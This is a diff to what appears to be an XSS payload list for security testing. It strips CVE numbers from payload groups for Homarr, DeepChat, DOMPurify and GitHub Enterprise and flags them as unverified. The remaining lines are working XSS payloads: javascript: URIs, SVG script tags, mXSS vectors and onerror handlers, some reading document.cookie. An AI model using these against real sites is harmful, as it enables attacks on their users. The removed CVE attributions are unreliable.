@@ -527,21 +527,24 @@ javascript:alert(1)
 <iframe srcdoc="<script>alert(1)</script>">
 <object data="data:text/html,<script>alert(1)</script>">
 
-<!-- ==================== PART 32: 2026 LATEST & CVE BASED ==================== -->
-<!-- CVE-2026-33510 - Homarr callbackUrl -->
+<!-- ==================== PART 32: 2026 LATEST & VENDOR-SPECIFIC ==================== -->
+<!-- NOTE: tags below were collected as vendor-specific payloads. UNVERIFIED against live
+     CVE instances - validate on your own test instance BEFORE reporting any of these. -->
+
+<!-- Homarr callbackUrl (OAuth open-redirect style sink) -->
 ?callbackUrl=javascript:alert(document.cookie)
 ?callbackUrl=data:text/html,<script>alert(1)</script>
 ?callbackUrl="><svg/onload=alert(1)>
 
-<!-- CVE-2026-43900 - DeepChat SVG Bypass -->
+<!-- DeepChat SVG payload (chat UI renders uploaded SVG) -->
 <svg><script>alert(1)</script></svg>
 <svg><a href="javascript:alert(1)">click</a></svg>
 
-<!-- CVE-2026-0540 - DOMPurify mXSS -->
+<!-- DOMPurify mXSS class vectors (XMP/IFRAME legacy parsing) -->
 <xmp><img src=x onerror=alert(1)></xmp>
 <iframe><img src=x onerror=alert(1)></iframe>
 
-<!-- CVE-2026-2266 - GitHub Enterprise -->
+<!-- Markdown rendered task-list + raw HTML (GHE / GitLab-flavored style) -->
 - [x] <img src=x onerror=alert(1)>
 - [ ] <svg/onload=alert(document.cookie)>
 
